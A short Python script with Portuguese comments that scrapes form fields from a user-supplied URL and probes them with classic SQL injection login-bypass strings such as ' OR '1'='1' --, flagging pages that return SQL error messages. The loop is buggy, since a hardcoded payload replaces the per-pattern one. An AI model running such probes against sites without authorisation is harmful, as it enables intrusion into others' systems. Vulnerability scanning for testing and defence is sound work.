import requests
from bs4 import BeautifulSoup


class DetectorSQLInjection:
    def __init__(self, url):
        self.url = url
        self.padroes_sql = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            '" OR "1"="1',
            '" OR "1"="1" --',
            '" OR "1"="1" #'
        ]

    def verificar_vulnerabilidade(self, parametro, valor):
        """
        Verifica se um parâmetro está vulnerável a SQL Injection.
        """
        for padrao in self.padroes_sql:
            #payload = {parametro: valor + padrao}
            payload = {parametro: "admin", "senha": "' OR '1'='1' --"}
            resposta = requests.get(self.url, params=payload)
            print(f"Testando {parametro} com payload {payload}")  # Adicionando feedback
            print(f"Payload gerado: {payload}")  # Para verificar o payload
            print(f'URL acessada: {resposta.url}')
            print('Conteudo da resposta:', resposta.text)
            if self.eh_vulneravel(resposta.text):
                print(f"Vulnerável detectado para {parametro} com payload {payload}")
                return True
        return False

    def eh_vulneravel(self, conteudo_pagina):
        """
        Verifica se o conteúdo da página indica uma vulnerabilidade.
        """
        mensagens_erro_sql = [
            'You have an error in your SQL syntax',
            'Unclosed quotation mark after the character string',
            'Syntax error in SQL statement',
            'Warning: mysql_fetch_array()',
            'Warning: mysql_query()',
            'Erro na sintaxe SQL.'  # Mensagem que você adicionou no PHP
        ]
        for mensagem in mensagens_erro_sql:
            if mensagem in conteudo_pagina:
                return True
        return False

    def analisar_site(self):
        """
        Realiza a análise do site para verificar vulnerabilidades em parâmetros de consulta.
        """
        resposta = requests.get(self.url)
        sopa = BeautifulSoup(resposta.text, 'html.parser')

        parametros = set()

        # Encontrar parâmetros em formulários HTML
        for formulario in sopa.find_all('form'):
            for input_elem in formulario.find_all('input'):
                nome_parametro = input_elem.get('name')
                if nome_parametro:
                    parametros.add(nome_parametro)

        # Testa se não encontrou nenhum parâmetro
        if not parametros:
            print("Nenhum parâmetro encontrado para testar.")
            return {}

        # Testar cada parâmetro coletado
        resultados = {}
        for parametro in parametros:
            print(f"Analisando parâmetro: {parametro}")  # Feedback
            vulneravel = self.verificar_vulnerabilidade(parametro, "admin")
            resultados[parametro] = "Vulnerável" if vulneravel else "Não Vulnerável"

        return resultados


def main():
    url = input('Digite a URL do site para análise: ')

    detector = DetectorSQLInjection(url)
    resultados = detector.analisar_site()

    if resultados:
        print('Resultados da Análise de Vulnerabilidade:')
        for parametro, status in resultados.items():
            print(f'Parâmetro: {parametro} - Status: {status}')
    else:
        print("Nenhum parâmetro vulnerável ou nenhum parâmetro encontrado.")


if __name__ == '__main__':
    main()
